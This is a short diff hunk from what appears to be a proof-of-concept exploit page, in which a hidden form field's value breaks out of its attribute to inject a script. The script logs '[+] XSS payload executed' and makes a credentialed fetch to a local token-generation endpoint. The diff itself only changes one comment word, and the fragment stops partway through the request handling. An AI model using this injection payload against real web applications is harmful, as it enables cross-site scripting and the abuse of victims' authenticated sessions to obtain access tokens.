@@ -14,7 +14,7 @@
     <input type="hidden" name="phone" value="123">
     <input type="hidden" name="zipCode" value='"><script>
       console.log("[+] XSS payload executed");
-      // UPDATED: use the new token endpoint
+      // FIXED: use the new token endpoint
       fetch("https://127.0.0.1:5000/api/access/generate", { credentials: "include" })
         .then(r => {
           console.log("[+] Token endpoint status:", r.status);
